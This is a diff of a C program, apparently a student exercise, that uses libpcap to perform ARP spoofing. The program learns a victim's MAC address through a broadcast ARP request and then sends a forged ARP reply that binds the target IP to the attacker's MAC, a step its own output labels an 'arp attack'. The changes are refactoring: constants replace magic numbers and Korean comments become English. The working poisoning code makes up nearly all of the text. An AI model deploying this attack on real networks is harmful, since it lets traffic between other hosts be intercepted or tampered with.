@@ -14,6 +14,8 @@
 #include <netinet/in.h>
 #include <sys/ioctl.h>
 
+#define IP_ADDR_LEN 4
+
 #pragma pack(push,1)
 struct arp_packet{
 	struct libnet_ethernet_hdr ETH_hdr;
@@ -133,8 +135,7 @@ int print_packet(struct arp_packet * packet)
 	return 0;
 }
 
-void make_arp_packet(	unsigned char * frame, struct arp_packet * packet, 
-			uint8_t ether_dhost[], uint8_t ether_shost[], uint16_t ether_type, 
+void make_arp_packet(	struct arp_packet * packet, uint8_t ether_dhost[], uint8_t ether_shost[], uint16_t ether_type, 
 			uint16_t arp_hrd_type, uint16_t arp_pro_type, uint8_t arp_hlen, uint8_t arp_plen, 
 			uint16_t arp_opcode, uint8_t src_hrd_addr[ETHER_ADDR_LEN], struct in_addr * src_pro_addr, 
 			uint8_t des_hrd_addr[ETHER_ADDR_LEN], struct in_addr * des_pro_addr)
@@ -157,9 +158,6 @@ void make_arp_packet(	unsigned char * frame, struct arp_packet * packet,
         memcpy(&packet->src_pro_addr, src_pro_addr, sizeof(struct in_addr));
         memcpy(packet->des_hrd_addr, des_hrd_addr, ETHER_ADDR_LEN);         
         memcpy(&packet->des_pro_addr, des_pro_addr, sizeof(struct in_addr));
-
-	memcpy(frame, packet, sizeof(struct arp_packet));
-
 }
 
 int main(int argc, char* argv[])
@@ -185,34 +183,29 @@ int main(int argc, char* argv[])
 	target_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
 	struct arp_packet * packet;
 	packet = (struct arp_packet *)calloc(1, sizeof(arp_packet));
-	unsigned char *frame = (unsigned char *)calloc(1, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN+sizeof(struct in_addr)+ETHER_ADDR_LEN+sizeof(struct in_addr));
 
-	uint16_t arp_type = 0x0806;					// ARP
-	uint16_t arp_hrd_type = 0x0001;					// Ethernet
-	uint16_t arp_pro_type = 0x0800;					// IPv4
-	uint16_t arp_opcode = 0x0001;					// request
+	uint16_t arp_type = ETHERTYPE_ARP;							// ARP	: 0x0806
+	uint16_t arp_hrd_type = ARPHRD_ETHER;							// Ethernet : 0x0001
+	uint16_t arp_pro_type =ETHERTYPE_IP;							// IPv4	: 0x0800
+	uint16_t arp_opcode = ARPOP_REQUEST;							// request : 0x0001
 	
 	getMacAddress(my_mac, argv[1]);								// get my mac, ip
 	getIpAddress(my_ip, argv[1]);
 	inet_aton(argv[2], sender_ip);								// get sender ip
 	inet_aton(argv[3], target_ip);								// get target ip
 	
-	make_arp_packet(frame, packet, BROADCAST_MAC, my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 4,
-                        arp_opcode, my_mac, my_ip, BROADCAST_MAC2, sender_ip);
+	make_arp_packet(packet, BROADCAST_MAC, my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
+			IP_ADDR_LEN, arp_opcode, my_mac, my_ip, BROADCAST_MAC2, sender_ip);
 
 //	print_packet(packet);
 	
-	if(pcap_sendpacket(fp, frame, sizeof(struct arp_packet)))				// send packet
+	if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(struct arp_packet)))		// send packet
 	{
 		fprintf(stderr, "\nError sending the packet\n");
 		return -1;
 	}
 		
 	printf("--------send broadcast arp packet!--------\n");
-//	printf("--------send_arp!--------\nframe	 	: ");
-//	for(int i=0; i<sizeof(arp_packet);i++)							// print frame
-//		printf("%02x ", frame[i]);
-//	printf("\n\n");					
 
 	while (true){
 		struct pcap_pkthdr* header;
@@ -228,7 +221,7 @@ int main(int argc, char* argv[])
 //		printf("%u bytes captured\n", header->caplen);
 
 		ETH_header = (libnet_ethernet_hdr *)rcv_packet;
-		if(ntohs(ETH_header->ether_type) != 0x0806)					// ARP 일때  진행
+		if(ntohs(ETH_header->ether_type) != ETHERTYPE_ARP)				// if not ARP
 //			printf("ETH type : %04x	-> It's ARP!\n", ntohs(ETH_header->ether_type));
 //		else {
 			continue;
@@ -243,10 +236,9 @@ int main(int argc, char* argv[])
                 rcv_packet += ETHER_ADDR_LEN;
                 des_pro_addr = (in_addr *)rcv_packet;
 
-		if(strcmp(inet_ntoa(*sender_ip), inet_ntoa(*src_pro_addr)) == 0)
+		if(strcmp(inet_ntoa(*sender_ip), inet_ntoa(*src_pro_addr)) == 0)		// src_pro_addr == sender_ip
 		{
-			if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)			
-								// src_pro_addr이 sender의 ip 주소이고 des_pro_addr이 내 ip 주소일 때
+			if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)		// des_pro_addr== my_ip
 			{
 				printf("--------sender mac get!!--------\n");
 				memcpy(sender_mac, src_hrd_addr, ETHER_ADDR_LEN);		// sender mac get
@@ -255,28 +247,23 @@ int main(int argc, char* argv[])
 		} 
 	}	
 	
-	arp_opcode = 0x0002;	
-	make_arp_packet(frame, packet, sender_mac, my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 4,
-                        arp_opcode, my_mac, target_ip, sender_mac, sender_ip);
+	arp_opcode = ARPOP_REPLY;								// reply : 2
+	make_arp_packet(packet, sender_mac, my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
+			IP_ADDR_LEN, arp_opcode, my_mac, target_ip, sender_mac, sender_ip);
 	
 //	print_packet(packet);	
 
-        if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)		// send packet
+        if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(arp_packet)))			// send packet
         {
                 fprintf(stderr, "\nError sending the packet\n");
                 return -1;
         }
 
 	printf("--------send arp attack!--------\n");
-//	printf("--------send_arp!--------\nframe		: ");
-//        for(int i=0; i<sizeof(arp_packet);i++)						// print frame
-//              printf("%02x ", frame[i]);
-//	printf("\n");
 
 	free(sender_ip);
 	free(target_ip);
 	free(packet);
-	free(frame);
 	
 	return 0;
 }
